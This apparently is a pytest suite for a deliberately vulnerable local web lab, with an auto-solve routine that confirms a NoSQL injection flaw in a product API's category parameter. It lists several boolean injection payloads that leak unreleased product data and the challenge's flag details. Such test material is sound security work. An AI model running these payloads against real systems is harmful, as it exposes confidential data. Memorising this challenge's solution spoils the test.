import pytest
import requests
import time
import json
from urllib.parse import quote

class TestNoSQLInjection:
    """Test suite for NoSQL injection vulnerability"""
    
    BASE_URL = "http://localhost:3206"
    
    def setup_method(self):
        """Wait for application to be ready"""
        max_retries = 30
        for i in range(max_retries):
            try:
                response = requests.get(f"{self.BASE_URL}/", timeout=5)
                if response.status_code == 200:
                    break
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        else:
            pytest.fail("Application not ready after 60 seconds")
    
    def test_home_page_accessible(self):
        """Test that home page is accessible"""
        response = requests.get(f"{self.BASE_URL}/")
        assert response.status_code == 200
        assert "TargetCorp" in response.text
    
    def test_products_page_accessible(self):
        """Test that products page is accessible"""
        response = requests.get(f"{self.BASE_URL}/products")
        assert response.status_code == 200
        assert "Product Catalog" in response.text
    
    def test_admin_page_accessible(self):
        """Test that admin page is accessible"""
        response = requests.get(f"{self.BASE_URL}/admin")
        assert response.status_code == 200
        assert "Admin Portal" in response.text
    
    def test_api_products_default(self):
        """Test that API returns only public products by default"""
        response = requests.get(f"{self.BASE_URL}/api/products")
        assert response.status_code == 200
        
        products = response.json()
        assert isinstance(products, list)
        
        # Should only return public products
        for product in products:
            assert product.get('status') == 'public'
    
    def test_api_products_category_filter(self):
        """Test that category filter works normally"""
        response = requests.get(f"{self.BASE_URL}/api/products?category=Electronics")
        assert response.status_code == 200
        
        products = response.json()
        assert isinstance(products, list)
        
        # Should only return Electronics products
        for product in products:
            assert product.get('category') == 'Electronics'
    
    def test_nosql_injection_detection(self):
        """Test detection of NoSQL injection vulnerability"""
        # Test with single quote to trigger potential error
        response = requests.get(f"{self.BASE_URL}/api/products?category='")
        assert response.status_code == 200
        
        # If vulnerable, this might return different results or errors
        products = response.json()
        # The injection should work and potentially return more products
    
    def test_nosql_injection_exploitation(self):
        """Test exploitation of NoSQL injection to access unreleased products"""
        # Use MongoDB boolean injection to bypass category filter
        payload = "Electronics'||1||'"
        encoded_payload = quote(payload)
        
        response = requests.get(f"{self.BASE_URL}/api/products?category={encoded_payload}")
        assert response.status_code == 200
        
        products = response.json()
        assert isinstance(products, list)
        
        # Should return all products including unreleased ones
        unreleased_products = [p for p in products if p.get('status') == 'unreleased']
        assert len(unreleased_products) > 0, "No unreleased products found - injection may not be working"
        
        # Verify specific unreleased products are present
        unreleased_skus = [p['sku'] for p in unreleased_products]
        expected_skus = ['GC-2025-001', 'QS-2025-002', 'SH-2025-003', 'SF-2025-004']
        
        for sku in expected_skus:
            assert sku in unreleased_skus, f"Expected unreleased product {sku} not found"
    
    def test_nosql_injection_alternative_payloads(self):
        """Test alternative NoSQL injection payloads"""
        payloads = [
            "Electronics'||'1'=='1'||'",
            "Electronics'||true||'",
            "Electronics'||1==1||'",
            "Electronics'||'a'=='a'||'"
        ]
        
        for payload in payloads:
            encoded_payload = quote(payload)
            response = requests.get(f"{self.BASE_URL}/api/products?category={encoded_payload}")
            assert response.status_code == 200
            
            products = response.json()
            unreleased_products = [p for p in products if p.get('status') == 'unreleased']
            
            # At least one payload should work
            if len(unreleased_products) > 0:
                break
        else:
            pytest.fail("No injection payloads worked")
    
    def test_nosql_injection_data_extraction(self):
        """Test extraction of sensitive data through NoSQL injection"""
        # Use injection to get all products
        payload = "Electronics'||1||'"
        encoded_payload = quote(payload)
        
        response = requests.get(f"{self.BASE_URL}/api/products?category={encoded_payload}")
        assert response.status_code == 200
        
        products = response.json()
        
        # Extract sensitive information
        unreleased_products = [p for p in products if p.get('status') == 'unreleased']
        
        # Verify sensitive data is exposed
        for product in unreleased_products:
            assert 'name' in product
            assert 'sku' in product
            assert 'price' in product
            assert 'description' in product
            assert 'release_date' in product
            
            # Verify this is sensitive unreleased data
            assert product['sku'].startswith(('GC-2025-', 'QS-2025-', 'SH-2025-', 'SF-2025-'))
    
    def test_auto_solve_vulnerability(self):
        """Auto-solve the vulnerability and extract flag information"""
        print("\n=== AUTO-SOLVE: NoSQL Injection Vulnerability ===")
        
        # Step 1: Detect the vulnerability
        print("1. Detecting NoSQL injection vulnerability...")
        payload = "Electronics'||1||'"
        encoded_payload = quote(payload)
        
        response = requests.get(f"{self.BASE_URL}/api/products?category={encoded_payload}")
        products = response.json()
        
        unreleased_products = [p for p in products if p.get('status') == 'unreleased']
        
        if len(unreleased_products) > 0:
            print("✅ Vulnerability confirmed! NoSQL injection successful.")
            
            # Step 2: Extract sensitive data
            print("2. Extracting unreleased product information...")
            print(f"Found {len(unreleased_products)} unreleased products:")
            
            for product in unreleased_products:
                print(f"   - {product['name']} (SKU: {product['sku']})")
                print(f"     Price: ${product['price']}")
                print(f"     Release Date: {product.get('release_date', 'TBD')}")
                print(f"     Description: {product['description']}")
                print()
            
            # Step 3: Flag information
            print("3. FLAG INFORMATION:")
            print("   Element to proof: Details of unreleased products")
            print("   Final flag info: Leaked details of unreleased products, such as names and SKUs")
            print()
            print("   Unreleased products exposed:")
            for product in unreleased_products:
                print(f"   - {product['name']} (SKU: {product['sku']})")
            
            print("\n✅ Vulnerability successfully exploited!")
            print("   The application is vulnerable to NoSQL injection in the category parameter.")
            print("   Attackers can access unreleased product information by injecting MongoDB operators.")
            
        else:
            pytest.fail("❌ Vulnerability not confirmed - no unreleased products found")

if __name__ == "__main__":
    # Run the auto-solve test
    test_instance = TestNoSQLInjection()
    test_instance.setup_method()
    test_instance.test_auto_solve_vulnerability() 